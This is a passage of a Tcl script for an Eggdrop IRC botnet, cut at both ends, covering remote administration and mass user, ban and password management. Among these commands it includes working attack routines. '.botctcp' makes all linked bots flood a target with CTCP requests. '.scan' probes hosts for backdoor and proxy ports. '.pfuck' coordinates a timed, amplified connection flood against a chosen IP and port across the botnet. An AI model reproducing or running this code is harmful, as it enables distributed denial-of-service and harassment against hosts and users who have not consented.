    if {[info exists errorInfo] && $errorInfo != ""} {
	set o $errorInfo
    }
    catch {$w $s} e
    if {$e != ""} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return 0
    }
    return 1
}

proc conn_try {s p} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} {
	set o $errorInfo
    }
    catch {set i [connect $s $p]} e
    if {$e != 0} {
	if {[info exists o]} {
	    set errorInfo $o
	} else {
	    set errorInfo ""
	}
	return $e
    }
    return $i
}

proc sconn_try {s p {v ""} {l ""}} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    set c "socket -async "
    if {$v != "" && $v != "default"} { append c "-myaddr $v " }
    if {$l != ""} { append c "-myport $l " }
    append c "$s $p"
    catch {set i [eval $c]} e
    if {$e != 0} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return $e
    }
    return $i
}

proc dcc:telnet {h i a} {
	global telnet
	set s [bi $a 0]; set p [bi $a 1]; set v [bi $a 2]; set l [bi $a 3]
	if {$p == ""} {
		pb $i "Usage: .telnet <server> <port> \[vhost \[sourceport\]\]"
		return 0
	}
	putcmdlog "\#$h\# telnet \[...\]"
	set n [sconn_try $s $p $v $l]
	if {![validsocket $n]} {
		pb $i "Sorry, connection failed : $n"
		return 0
	}
	pb $i "Ok, connection established with [b]$s[b] p [b]$p[b] !"
	pb $i "To force quit, type '[b].telnetquit[b]' ! ;)"
	set telnet($i) $n
	fconfigure $n -blocking 0 -buffering none
	fileevent $n readable "telnet_recv $i $n"
	control $i telnet_send
}

proc dcc:botctcp {h i a} {
    global server
    set t [bi $a 0]
    if {$t == ""} {
        putcmdlog "\#$h\# botctp help"
        pb $i "Usage: '.botctcp nickname' or '.botctcp \#channel'"
        return 0
    }
    if {$server != ""} {
	putcmdlog "\#$h\# botctcp $t"
	putserv "PRIVMSG $t :\001VERSION\001"
	putserv "PRIVMSG $t :\001CLIENTINFO\001"
	putserv "PRIVMSG $t :\001VERSION\001"
	putserv "PRIVMSG $t :\001CLIENTINFO\001"
	putserv "PRIVMSG $t :\001VERSION\001"
	putserv "PRIVMSG $t :\001PING\001"
    }
    putallbots "botctcp $h $t"
}

proc recv_botctcp {b c a} {
    global server
    if {$server == ""} { return 0 }
    set h [bi $a 0]
    set t [bi $a 1]
    putserv "PRIVMSG $t :\001VERSION\001"
    putserv "PRIVMSG $t :\001CLIENTINFO\001"
    putserv "PRIVMSG $t :\001VERSION\001"
    putserv "PRIVMSG $t :\001CLIENTINFO\001"
    putserv "PRIVMSG $t :\001VERSION\001"
    putserv "PRIVMSG $t :\001PING\001"
    bl "CTCP-Flooding $t : requested by $h ( from $b )"
}

proc dcc:botping {h i a} {
    putcmdlog "\#$h\# botping [lrange $a 0 end]"
    if {$a != ""} {
	set b [bi $a 0]
	if {[islinked $b]} {
	    pb $i "Pinging $b..."
	    putbot $b "botping $i [clock clicks]"
	} else {
	    pb $i "I can't find '[b]$b[b]' as a linked bot.. :("
	}
    } else {
	if {[bots] != ""} {
	    pb $i "Pinging all bots..."
	    putallbots "botping $i [clock clicks]"
	} else {
	    pb $i "No bots linked.. :("
	}
    }
}

proc recv_botping {b c a} {
    putbot $b "botpingreturn [lindex $a 0] [lindex $a 1]"
}

proc bot_botpingreturn {b c a} {
    pb [bi $a 0] "Ping reply from $b \t: [expr abs(([clock clicks] - [lindex $a 1]) / 1000000.0)] second(s)"
}

proc dcc:scan {h idx arg} {
    set scanhost [bi $arg 0]
    set port1 [bi $arg 1]
    set port2 [bi $arg 2]
    set scanfound ""
    if { $scanhost == "" } {
	pb $idx "Usage : .scan <HOST>"
	pb $idx "to scan HOST at the most commonely used ports"
	pb $idx "or .scan <HOST> \[PORT\]"
	pb $idx "to scan host HOST at port PORT"
	pb $idx "or .scan <HOST> \[PORT1\] \[PORT2\]"
	pb $idx "to san host HOST from PORT1 to PORT2 ."
	return 0
    }
    putcmdlog "\#$h\# scan [lrange $arg 0 end]"
    if { $port1 == "" } {
	pb $idx "Scanning $scanhost..."
	catch {socket $scanhost 12345} scansock
	if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
	    close $scansock
	    lappend scanfound "Netbus"
	}
	catch {socket $scanhost 31337} scansock
	if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
	    close $scansock
	    lappend scanfound "Bo"
	}
	catch {socket $scanhost 1080} scansock
	if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
	    close $scansock
	    lappend scanfound "Wingate"
	}
	catch {socket $scanhost 143} scansock
	if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
	    close $scansock
	    lappend scanfound "Imap"
	}
	if {$scanfound == ""} {
	    set scanfound "Nothing"
	}
	pb $idx "Port-Scan result for $scanhost:"
	putdcc $idx "[boja]----------------------------------"
	putdcc $idx "[boja] [b]*[b] Possibly running: $scanfound"
	putdcc $idx "[boja]----------------------------------"
	putdcc $idx "[boja] -------end of port scanning-------"
	return 0
    } else {
	if { $port2 == "" } {
	    pb $idx "Scanning $scanhost at port $port1..."
	    catch {socket $scanhost $port1} scansock
	    if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
		lappend scanfound "Opened"
		close $scansock
	    } else {
		lappend scanfound "Closed"
	    }
	    pb $idx "Port-Scan result for $scanhost:"
	    putdcc $idx "[boja]----------------------------------"
	    putdcc $idx "[boja] [b]*[b] Port $port1 is $scanfound !"
	    putdcc $idx "[boja]----------------------------------"
	    putdcc $idx "[boja] -------end of port scanning-------"
	} else {
	    pb $idx "Scanning $scanhost from port $port1 to port $port2..."
	    for { set j $port1 } { $j < $port2 } { incr j } {
		catch {socket $scanhost $j} scansock
		if {([string range $scansock 0 3] == "sock") && ([lindex $scansock 1] == "")} {
		    lappend scanfound "$j"
		    close $scansock
		}
	    }
	    if {$scanfound == ""} { set scanfound "-=none=-" }
	    pb $idx "Port-Scan result for $scanhost:"
	    putdcc $idx "[boja]----------------------------------"
	    putdcc $idx "[boja] [b]*[b] Opened ports \[$port1..$port2\] : $scanfound"
	    putdcc $idx "[boja]----------------------------------"
	    putdcc $idx "[boja] -------end of port scanning-------"
	}
    }
}

proc dcc:pfuck {h idx arg} {
    set target [bi $arg 0]
    set fport  [bi $arg 1]
    set ftime  [bi $arg 2]
    set fampli [bi $arg 3]
    set def_ftime 5
    set def_fampli 10
    if {[strl $target] == "stop"} {
	putcmdlog "#$h# pfuck stop"
	foreach t [utimers] {
	    if {[string match "*smart_port_flood*" [lindex $t 1]]} {
		set l [lindex $t 1]
		bl "Port Fucker: Stopped flooding [lindex $l 1] at port [lindex $l 2]."
		killutimer [lindex $t 2]
	    }
	}
	putallbots "stop_pfuck $h"
	return 0
    }
    if {$fport == ""} {
	pb $idx "Usage: .pfuck <target-ip> <port> \[flood-time \[amplification-factor\]\] "
	return 0
    }
    if {[catch {connect $target $fport}] != 0} {
	pb $idx "Port Fucker: Sorry, could not find host/ip $target.. :o("
	return 0
    }
    if {$ftime == ""} {
	pb $idx "Port Fucker: No flood-time specified: assuming default ( $def_ftime min ).."
	set ftime $def_ftime
	unset def_ftime
    }
    if {$fampli == ""} {
	pb $idx "Port Fucker: No amplification factor specified: assuming default ( x$def_fampli ).."
	set fampli $def_fampli
	unset def_fampli
    }
    putcmdlog "#$h# pfuck $target  $fport  $ftime"
    bl "Port Fucker: flooding $target at port $fport for $ftime min : requested by $h."
    smart_port_flood $target $fport $fampli
    timer $ftime "stop_port_flood [p_test $target] $fport"
    putallbots "pfuck $h $target $fport $ftime $fampli"
}

proc recv_pfuck {bot command arg} {
    set h   [bi $arg 0]
    set target [bi $arg 1]
    set fport  [bi $arg 2]
    set ftime  [bi $arg 3]
    set fampli [bi $arg 4]
    bl "Port Fucker: flooding $target at port $fport for $ftime min : requested by $h ( from $bot )"
    smart_port_flood $target $fport $fampli
    timer $ftime "stop_port_flood [p_test $target] $fport"
}

proc recv_stop_pfuck {bot command arg} {
    set h [bi $arg 0]
    bl "Port Fucker: Stopping floods: requested by $h ( from $bot )"
    foreach t [utimers] {
	if {[string match "*smart_port_flood*" [lindex $t 1]]} {
	    set l [lindex $t 1]
	    bl "Port Fucker: Stopped flooding [lindex $l 1] at port [lindex $l 2]."
	    killutimer [lindex $t 2]
	}
    }
}

proc smart_port_flood {target port ampli} {
    for {set i 0} {$i < $ampli } {incr i} {
	catch {connect $target $port} 0
    }
    utimer 1 "smart_port_flood [p_test $target] $port $ampli"
}

proc stop_port_flood {target port} {
    foreach t [utimers] {
	if {[string match "*smart_port_flood $target $port*" [lindex $t 1]]} {
	    bl "Port Fucker: Stopped flooding $target at port $port."
	    killutimer [lindex $t 2]
	}
    }
}

##########################
# Helpfull Mass Commands #
##########################

bind dcc n madd dcc:madd
bind bot - madd recv_madd
bind dcc n mkill dcc:mkill
bind bot - mkill recv_mkill
bind dcc m|m mchattr dcc:mchattr
bind bot - mchattr recv_mchattr
bind dcc t|m m+host dcc:m+host
bind bot - m+host recv_m+host
bind dcc t|m m-host dcc:m-host
bind bot - m-host recv_m-host
bind dcc n m+bot dcc:m+bot
bind bot - m+bot recv_m+bot
bind dcc n m-bot dcc:mkill
bind dcc t mbotattr dcc:mbotattr
bind bot - mbotattr bot:mbotattr
bind dcc m mchpass dcc:mchpass
bind bot - mchpass recv_mchpass
bind dcc t mchaddr dcc:mchaddr
bind bot - mchaddr recv_mchaddr
bind dcc o|o mhandle dcc:mhandle
bind bot - mhandle recv_mhandle
bind dcc m m+ban dcc:m+ban
bind bot - m+ban recv_m+ban
bind dcc m m-ban dcc:m-ban
bind bot - m-ban recv_m-ban
bind dcc t mjump dcc:mjump
bind bot - mjump recv_mjump

proc dcc:madd {h i a} {
    set n [bi $a 0] ; set s [bi $a 1] ; set g [stru [bi $a 2]]
    if {[string length $g] != 1} {
	pb $i "Usage: .madd <nickname> <ident@hostmask> A"
	pb $i "Or   : .madd <nickname> <ident@hostmask> X/Y/Z/..."
	pb $i "See '.help madd' to know more... ;)"
	return 0
    }
    putcmdlog "\#$h\# madd $n $s $g"
    set bs ""
    if {$g == "A"} {
	set g "ALL connected"
	putallbots "madd $n $s $h"
    } else {
	foreach b [bots] {
	    if {[matchattr $b $g]} {
		putbot $b "madd $n $s $h"
		lappend bs $b
	    }
	}
	pb $i "Sent add request for $n to $bs."
    }
    bl "Adding $n ( $s ) on $g bots : requested by $h."
    if {[validuser $n]} {
	pb $i "Warning: $n is already a registered user."
	pb $i "Trying to add him on other bots ;)"
    } else {
	adduser $n $s
	chattr  $n +hp
    }
}

proc recv_madd {b c a} {
    set w [bi $a 0] ; set m [bi $a 1] ; set h [bi $a 2] ; if {[validuser $w]} { return 0 }
    if {![matchattr $h m]} { bl "Refused add request for $w by $h : not master!" ; return 0 }
    adduser $w $m ; chattr $w +fh ; bl "Added $w ( $m ) : requested by $h ( from $b )"
}

proc flagcheck {h u f c} {
    if {[matchattr $u m] && ![matchattr $h n] && [strl $u] != [strl $h]} {
	set r "0 Sorry, only global owners can manipulate owner/master 's flags.."
	return $r
    }
    if {[string match *n* $f] || [string match *m* $f]} {
	if {$c == "" && ![matchattr $h n]} {
	    set r "0 Sorry, only global owners can manipulate m/n flags.."
	    return $r
	} elseif {$c != "" && ![matchattr $h n] && ![matchattr $h |n $c]} {
	    set r "0 Sorry, only $c 's owners can manipulats m/n flags for $c.."
	    return $r
	}
    }
    if {$c == "" && ![matchattr $h m] && $f != "+p" && $f != "-p"} {
	set r "0 Sorry, only global masters can manupulate global flags.. You can only give/remove the +p global flag.."
	return $r
    }
    if {$c != "" && ![matchattr $h m] && ![matchattr $h |m $c]} {
	set r "0 Sorry, only $c 's masters can manipulate $c 's users.."
	return $r
    }
    return 1
}

proc dcc:mchattr {h i a} {
    set g [stru [bi $a 0]] ; set u [bi $a 1] ; set f [bi $a 2] ; set c [bi $a 3]
    if {$f == "" || [string length $g] != 1} {
	pb $i "Usage: .mchattr A <nickname> <+/-flags> \[\#channel\]"
	pb $i "Or   : .mchattr X/Y/Z/... <nickname> <+/-flags> \[#channel\]"
	pb $i "Or   : .mchattr A <+flags> <+/-flags> \[\#channel\]"
	pb $i "Or   : .mchattr X/Y/Z/... <+flags> <+/-flags> \[\#channel\]"
	pb $i "See '.help mchattr' to know more... ;)"
	return 0
    }
    if {[string index $u 0] == "+"} {
	set l ""
	foreach U [userlist [string range $u 1 end]] {
	    set r [flagcheck $h $U $f $c]
	    if {[bi $r 0] != 1} { pb $i "[br $r 1 end] - skipping user.." ; continue }
	    lappend l $U
	}
    } else {
	set r [flagcheck $h $u $f $c] ; if {[bi $r 0] != 1} { pb $i [br $r 1 end] ; return 0 }
    }
    putcmdlog "\#$h\# mchattr $g $u $f $c"
    if {[validuser $u]} {
	if {$c != ""} {
	    if {[validchan $c]} {
		if {[string index $f 0] != "|" } { set f "|$f" } ; chattr $u $f $c
	    } else {
		pb $i "Warning: $c is not a known channel.. Trying to change $u 's flags on other bots ;)"
	    }
	} else {
	    chattr $u $f
	}
    } else {
	if {[string index $u 0] == "+"} {
	    if {$l == ""} { pb $i "No users found with $u flag.. Aborting." ; return 0 }
	    pb $i "Found [llength $l] users flagged $u : changing flags.."
	    if {$c != ""} {
		if {[validchan $c]} {
		    if {[string index $f 0] != "|" } { set f "|$f" }
		    foreach U $l { chattr $U $f $c }
		} else {
		    pb $i "Warning: $c is not a known channel.. Trying to change $u 's flags on other bots ;)"
		}
	    } else {
		foreach U $l { chattr $U $f }
	    }
	} else {
	    pb $i "Warning: $u is not a known user.. Trying to change his flags on other bots ;)"
	}
    }
    if {[string index $u 0] == "+"} { set q "$u users" } else { set q $u }
    if {$g == "A" } {
	set g "ALL connected"
	if {[string index $u 0] == "+"} {
	    foreach U $l { putallbots "mchattr $h $U $f $c" }
	} else {
	    putallbots "mchattr $h $u $f $c"
	}
    } else {
	set bs ""
	foreach b [bots] {
	    if {[matchattr $b $g]} {
		if {[string index $u 0] == "+"} {
		    foreach U $l { putbot $b "mchattr $h $U $f $c" }
		} else {
		    putbot $b "mchattr $h $u $f $c"
		}
		lappend bs $b
	    }
	}
	regsub -all " " $bs ", " bs ; pb $i "Sent mchattr request for $q to : $bs."
    }
    if {$c != "" } { set c " for $c" } ; bl "Changing $q 's flags $f$c on $g bots : requested by $h."
}

proc recv_mchattr {b cm a} {
    set h [bi $a 0] ; set u [bi $a 1] ; set f [bi $a 2] ; set c [bi $a 3]
    if {![validuser $u] || ($c != "" && ![validchan $c])} { return 0 }
    set r [flagcheck $h $u $f $c]
    if {[bi $r 0] != 1} {
	bl "Refused mchattr request made by $h from $b ( chattr $u $f $c ) - [br $r 1 end]" ; return 0
    }
    set q "Changing $u 's flags $f "
    if {$c != ""} {
	if {[string index $f 0] != "|"} { set f "|$f" } ; chattr $u $f $c ; append q "$c "
    } else { chattr $u $f }
    append q ": requested by $h ( from $b )" ; bl $q
}

proc dcc:mkill {h idx arg} {
    set killnick [bi $arg 0]
    set grp [stru [bi $arg 1]]
    if {[string length $grp] != 1} {
	pb $idx "Usage: .mkill <nickname> A"
	pb $idx "Or   : .mkill <nickname> X/Y/Z/..."
	pb $idx "See '.help mkill' to know more... ;)"
	return 0
    }
    if {[validuser $killnick]} {
	if { [matchattr $killnick "n"] } {
	    pb $idx "Sorry, $killnick is an owner ! You can 't use .mkill to kill owners."
	    pb $idx "If you are sure, use first .mchattr A/X/Y/Z.. $killnick -n .."
	    return 0
	} else {
	    deluser $killnick
	}
    } else {
	pb $idx "Warning: $killnick is not a registered user."
	pb $idx "Trying to kill him from other bots ;)"
    }
    set botsent ""
    putcmdlog "\#$h\# mkill $killnick $grp"
    if { $grp == "A" } {
	set grp "ALL connected"
	putallbots "mkill $killnick $h"
    } else {
	foreach bot [bots] {
	    if { [matchattr $bot "$grp"] } {
		putbot $bot "mkill $killnick $h"
		lappend botsent $bot
	    }
	}
	pb $idx "Sent kill request for $killnick to $botsent."
    }
    bl "Killing $killnick from $grp bots : requested by $h."
}


proc recv_mkill {bot command arg} {
    set killnick [bi $arg 0]
    set mh [bi $arg 1]
    if {![validuser $killnick]} {
	return 0
    }
    if {![matchattr $killnick "n"]} {
	deluser $killnick
	bl "Killed $killnick : requested by $mh ( from $bot )"
    } else {
	bl "Warning: I can't kill $killnick as requested by $mh from $bot : $killnick is an owner!"
    }
}

proc dcc:m+host {h i a} {
    set anick [bi $a 0]
    set ahost [bi $a 1]
    if {$ahost == ""} {
	pb $i "Usage : .m+host <user> <newident@newhostmask>"
	return 0
    }
    if {![matchattr $h m] && ![matchattr $h t]} {
	if {$anick != $h} {
	    pb $i "Sorry, you can only add hosts to yourself !"
	    return 0
	}
    }
    putcmdlog "#$h# m+host $anick $ahost"
    if {[matchattr $anick n]} {
	if {[matchattr $h n]} {
	    addhost $anick $ahost
	    bl "Added host $ahost to $anick : requested by $h."
	} else {
	    pb $i "Sorry, can't add hostmask to the bot owner..."
	    pb $i "Trying to add $ahost to $anick on other bots ;)"
	}
    } elseif {[matchattr $anick m]} {
	if {[matchattr $h m]} {
	    addhost $anick $ahost
	    bl "Added host $ahost to $anick : requested by $h."
	} else {
	    pb $i "Sorry, can't add hostmask to a bot master..."
	    pb $i "Trying to add $ahost to $anick on other bots ;)"
	}
    } else {
	if {[validuser $anick]} {
	    addhost $anick $ahost
	    bl "Added host $ahost to $anick : requested by $h."
	} else {
	    pb $i "Warning: Could not add $ahost to $anick : no such user."
	    pb $i "Trying to add host on other bots ;)"
	}
    }
    putallbots "m+host $anick $ahost $h"
    pb $i "Sent addhost request to ALL connected bots."
}


proc recv_m+host {b c a} {
    set anick [bi $a 0]
    set ahost [bi $a 1]
    set h [bi $a 2]
    if {[matchattr $anick n]} {
	if {[matchattr $h n]} {
            addhost $anick $ahost
            bl "Added host $ahost to $anick : requested by $h ( from $b )"
	} else {
	    bl "Warning: could not add host $ahost to $anick as requested"
            bl "by $h from $b, because $anick is an Owner and $h not."
	}
    } elseif {[matchattr $anick m]} {
	if {[matchattr $h m]} {
	    addhost $anick $ahost
	    bl "Added host $ahost to $anick : requested by $h ( from $b )"
	} else {
	    bl "Warning: could not add host $ahost to $anick as requested"
	    bl "by $h from $b, because $anick is a bot Master and $h not."
	}
    } else {
        if {[validuser $anick]} {
            addhost $anick $ahost
            bl "Added host $ahost to $anick : requested by $h ( from $b )"
	}
    }
}

proc dcc:m-host {h i a} {
    set rnick [bi $a 0]
    set rhost [bi $a 1]
    if {$rhost == ""} {
	pb $i "Usage : .m-host <user> <oldident@oldhostmask>"
	return 0
    }
    if {![matchattr $h m] && ![matchattr $h t]} {
	if {$rnick != $h} {
	    pb $i "Sorry, you can only remove hosts from yourself !"
	    return 0
	}
    }
    putcmdlog "#$h# m-host $rnick $rhost"
    if {[matchattr $rnick n] } {
	if {[matchattr $h n] } {
	    delhost $rnick $rhost
	    bl "Removed host $rhost from $rnick : requested by $h."
	} else {
	    pb $i "Sorry, can 't remove hostmask from the bot owner..."
	    pb $i "Trying to remove $rhost from $rnick on other bots ;)"
	}
    } elseif {[matchattr $rnick m]} {
	if {[matchattr $h m]} {
	    delhost $rnick $rhost
	    bl "Removed host $rhost from $rnick : requested by $h."
	} else {
	    pb $i "Sorry, can't remove hostmask from a bot master..."
	    pb $i "Trying to remove $rhost from $rnick on other bots ;)"
	}
    } else {
	if {[validuser $rnick]} {
	    delhost $rnick $rhost
	    bl "Removed host $rhost from $rnick : requested by $h"
	} else {
	    pb $i "Warning: Could not remove $rhost from $rnick : no such user."
	    pb $i "Trying to remove host on other bots ;)"
	}
    }
    putallbots "m-host $rnick $rhost $h"
    pb $i "Sent delhost request to ALL connected bots."
}


proc recv_m-host {b c a} {
    set rnick [bi $a 0]
    set rhost [bi $a 1]
    set h [bi $a 2]
    if {[matchattr $rnick n]} {
	if {[matchattr $h n]} {
            delhost $rnick $rhost
            bl "Removed host $rhost from $rnick : requested by $h ( from $b )"
	} else {
	    bl "Warning: could not remove host $rhost from $rnick as requested"
            bl "by $h from $b, because $rnick is an Owner and $h not."
	}
    } elseif {[matchattr $rnick m]} {
	if {[matchattr $h m]} {
	    delhost $rnick $rhost
	    bl "Removed host $rhost from $rnick : requested by $h ( from $b )"
	} else {
	    bl "Warning: Could not remove $rhost from $rnick as requested"
	    bl "by $h from $b, because $rnick is a bot Master and $h not."
	}
    } else {
        if {[validuser $rnick]} {
            delhost $rnick $rhost
            bl "Removed host $rhost from $rnick : requested by $h ( from $b )"
	}
    }
}

proc dcc:m+bot {h idx arg} {
    set botadd [bi $arg 0]
    set mhost  [bi $arg 1]
    set grp [stru [bi $arg 2]]
    set botsent ""
    if {[string length $grp] != 1} {
	pb $idx "Usage: .m+bot <botname> <address:botport/userport> A"
	pb $idx "Or   : .m+bot <botname> <address:botport/userport> X/Y/Z/..."
	return 0
    }
    putcmdlog "\#$h\# m+bot $botadd $mhost $grp"
    if { $grp == "A" } {
	set grp "ALL connected"
	putallbots "m+bot $botadd $mhost $h"
    } else {
	foreach bot [bots] {
	    if { [matchattr $bot "$grp"] } {
		putbot $bot "m+bot $botadd $mhost $h"
		lappend botsent $bot
	    }
	}
	pb $idx "Sent add request for $botadd to $botsent."
    }
    bl "Adding bot $botadd ( $mhost ) on $grp bots : requested by $h."
    if {[validuser $botadd]} {
	pb $idx "Warning: $botadd is already a registered user."
	pb $idx "Trying to add him on other bots ;)"
    } else {
	addbot $botadd $mhost
	chattr  $botadd +fo
    }
}

proc recv_m+bot {bot command arg} {
    set botadd [bi $arg 0]
    set mhost  [bi $arg 1]
    set mh  [bi $arg 2]
    if {[validuser $botadd]} {
	bl "Warning: $botadd is already a registered user ( nothing to do )."
    } else {
	addbot $botadd $mhost
	chattr  $botadd +fo
	bl "Added bot $botadd ( $mhost ) : requested by $mh ( from $bot )"
    }
}

proc dcc:mbotattr {h i a} {
    set g [stru [bi $a 0]] ; set u [bi $a 1] ; set f [bi $a 2]
    if {$f == "" || [string length $g] != 1} {
	pb $i "Usage: .mbotattr A <botname> <+/-flags>"
	pb $i "Or   : .mbotattr X/Y/Z/... <botname> <+/-flags>"
	pb $i "See '.help mbotattr' to know more... ;)" ; return 0
    }
    putcmdlog "\#$h\# mbotattr $g $u $f" ; set bs ""
    if {[validuser $u]} {
	if {![matchattr $u b]} { pb $i "Sorry, $u is not a bot!!! :)" ; return 0 } else { botattr $u $f }
    } else {
	pb $i "Warning: $u is not a known bot.. Trying to change his flags on other bots ;)"
    }
    if {$g == "A"} {
	set g "ALL connected" ; putallbots "mbotattr $h $u $f"
    } else {
	foreach b [bots] { if {[matchattr $b $g]} { putbot $b "mbotattr $h $u $f" ; lappend bs $b } }
	regsub -all " " $bs ", " bs ; pb $i "Sent mbotattr request for $u to : $bs."
    }
    bl "Changed bot-flags $f to bot $u : requested by $h."
}
proc bot:mbotattr {b c a} {
    set h [bi $a 0] ; set u [bi $a 1] ; set f [bi $a 2]
    if {![validuser $u] || ![matchattr $u b]} { return 0 }
    botattr $u $f ; bl "Changed bot-flags $f to bot $u : requested by $h ( from $b )"
}

proc dcc:mchpass {h idx arg} {
    set nick [bi $arg 0]
    set newpass [bi $arg 1]
    if {$newpass == ""} {
       set act1 "remove"
       set act2 "Removed"
    } else {
       set act1 "change"
       set act2 "Changed"
    }
    if {$nick == ""} {
	pb $idx "Usage : .mchpass <nickname> \[newpassword\]"
	pb $idx "Use .mchpass <nickname> <newpassword> to change nickname 's password"
	pb $idx "on ALL connected bots, or .mchpass <nickname> without other parameters"
	pb $idx "to remove his password from ALL connected bots."
	pb $idx "Note : <nickname> MUST be a valid user!"
	return 0
    }
    if {[validuser $nick]} {
	if {[matchattr $nick n]} {
            if {$nick != $h} {
		pb $idx "Sorry, you can not $act1 owner passwords! :("
		return 0
	    }
	} elseif {[matchattr $nick m]} {
	    if {$nick != $h || ![matchattr $h n]} {
		pb $idx "Sorry, you can not $act1 master passwords ! :("
		return 0
	    }
	}
	putcmdlog "\#$h\# mchpass $nick \[...\]"
	pb $idx "Trying to $act1 password for $nick on ALL connected bots."
	setuser $nick PASS $newpass
	bl "$act2 password for $nick on ALL connected bots : requested by $h."
	putallbots "mchpass $h $nick $newpass"
    } else {
        pb $idx "Warning: $nick is not a valid user !"
    }
}

proc recv_mchpass {bot command arg} {
    set h [bi $arg 0]
    set nick [bi $arg 1]
    set newpass [bi $arg 2]
    if {$newpass == ""} {
	set act1 "remove"
	set act2 "Removed"
    } else {
	set act1 "change"
	set act2 "Changed"
    }
    if {![validuser $nick]} {
	return 0
    }
    if {[matchattr $nick "n"]} {
	if {$nick == $h} {
	    setuser $nick PASS $newpass
	    bl "$act2 password for $nick : requested by $h ( from $bot )"
	} else {
	    bl "Could not $act1 password for $nick as requested by $h"
	    bl "from $bot, because $nick is an owner on this bot and $h not!"
	}
    } else {
	setuser $nick PASS $newpass
	bl "$act2 password for $nick : requested by $h ( from $bot )"
    }
}

proc dcc:mchaddr {h i a} {
    set botnick [bi $a 0]
    set newaddr [bi $a 1]
    if {$newaddr == ""} { pb $i "Usage : .mchaddr <botname> <newaddress>" ; return 0 }
    if {[matchattr $botnick b]} {
	putcmdlog "\#$h\# mchaddr $botnick $newaddr"
	bl "Changing address for bot $botnick to $newaddr on ALL connected bots : requested by $h."
	setuser $botnick BOTADDR $newaddr
	rehash
    } else {
	pb $i "Sorry, $botnick is not a known bot !"
	pb $i "Trying to change his address on other bots ;)"
    }
    putallbots "mchaddr $h $botnick $newaddr"
}


proc recv_mchaddr {b cm a} {
    set h [bi $a 0] ; set n [bi $a 1] ; set d [bi $a 2]
    if {[matchattr $n b]} {
	setuser $n BOTADDR $d
	rehash
	bl "Changed address for bot $n to $d : requested by $h ( from $b )"
    }
}

proc dcc:mhandle {h i a} {
    set n [bi $a 0]
    if {$n == ""} { pb $i "Usage : .mhandle <newhandle>" ; return 0 }
    putcmdlog "#$h# mhandle $n"
    if {![validuser $n]} {
	chnick $h $n ; putallbots "mhandle $h $n"
    } else {
	pb $i "Sorry, $n is already a registered user!"
    }
}

proc recv_mhandle {b cm a} {
    set h [bi $a 0] ; set n [bi $a 1]
    if {![validuser $h]} { bl "Warning: could not change nick for $h : no such user." ; return 0 }
    if {![validuser $n]} {
	chnick $h $n
    } else {
	bl "Warning: could not change nick for $h : $n is already a registered user!"
    }
}

proc dcc:m+ban {h i a} {
    set g [stru [bi $a 0]]
    if {$g == "A"} { set gr "ALL connected" } else { set gr $g }
    set banhost [bi $a 1]
    if {$banhost == "" || [string length $g] != 1} {
	pb $i "Usage : .m+ban A <hostmask> \[\#channel\] \[sticky\] \[comment\]"
	pb $i "to ban <hostmask> on ALL connected bots, or"
	pb $i ".m+ban X/Y/Z/... <hostmask> \[\#channel\] \[sticky\] \[comment\]"
	pb $i "to ban <hostmask> only on X, Y, or Z-flagged bots.."
	return 0
    }
    putcmdlog "\#$h\# m+ban $a"
    set banchan [bi $a 2]
    if {$banchan != ""} {
	if {[string match "\#*" $banchan]} {
	    set sticky [strl [bi $a 3]]
	    if {$sticky != ""} {
		if {$sticky == "sticky"} {
		    set comment [lrange $a 4 end]
		} else {
		    set comment [lrange $a 3 end]
		    set sticky ""
		}
	    } else {
		set comment ""
	    }
	    if {$comment == ""} { set comment [boja] }
	    bl "Adding <$banhost> to $banchan banlist on $gr bots : requested by $h."
	    if {$sticky != "" } {
		if {[validchan $banchan]} {
		    newchanban $banchan $banhost $h $comment 0 sticky
		} else {
		    pb $i "Sorry, I don't monitor $banchan..Sending ban-request to other bots.. ;)"
		}
		if {$g == "A"} {
		    putallbots "m+ban channel $banchan $banhost $h 0 sticky $comment"
		} else {
		    set botsent ""
		    foreach b [bots] {
			if {[matchattr $b $g]} {
			    putbot $b "m+ban channel $banchan $banhost $h 0 sticky $comment"
			    lappend botsent $b
			}
		    }
		    pb $i "Sent ban request for <$banhost> to $botsent"
		}
	    } else {
		if {[validchan $banchan]} {
		    newchanban $banchan $banhost $h $comment 0
		} else {
		    pb $i "Sorry, I don't monitor $banchan..Sending ban-request to other bots.. ;)"
		}
		if {$g == "A"} {
		    putallbots "m+ban channel $banchan $banhost $h 0 $comment"
		} else {
		    set botsent ""
		    foreach b [bots] {
			if {[matchattr $b $g]} {
			    putbot $b "m+ban channel $banchan $banhost $h 0 $comment"
			    lappend botsent $b
			}
		    }
		    pb $i "Sent ban request for <$banhost> to $botsent."
		}
	    }
	} else {
	    set sticky [strl $banchan]
	    if {$sticky == "sticky"} {
		set comment [lrange $a 3 end]
	    } else {
		set comment [lrange $a 2 end]
		set sticky ""
	    }
	    if {$comment == ""} { set comment [boja] }
	    bl "Adding <$banhost> to the global banlist on $gr bots : requested by $h."
	    if {$sticky != "" } {
		newban $banhost $h $comment 0 sticky
		if {$g == "A"} {
		    putallbots "m+ban global $banhost $h 0 sticky $comment"
		} else {
		    set botsent ""
		    foreach b [bots] {
			if {[matchattr $b $g]} {
			    putbot $b "m+ban global $banhost $h 0 sticky $comment"
			    lappend botsent $b
			}
		    }
		    pb $i "Sent ban request for <$banhost> to $botsent."
		}
	    } else {
		newban $banhost $h $comment 0
		if {$g == "A"} {
		    putallbots "m+ban global $banhost $h 0 $comment"
		} else {
		    set botsent ""
		    foreach b [bots] {
			if {[matchattr $b $g]} {
			    putbot $b "m+ban global $banhost $h 0 $comment"
			    lappend botsent $b
			}
		    }
		    pb $i "Sent ban request for <$banhost> to $botsent."
		}
	    }
	}
    } else {
	newban $banhost $h [boja] 0
	if {$g == "A"} {
	    putallbots "m+ban global $banhost $h 0 [boja]"
	} else {
	    set botsent ""
	    foreach b [bots] {
		if {[matchattr $b $g]} {
		    putbot $b "m+ban global $banhost $h 0 [boja]"
		    lappend botsent $b
		}
	    }
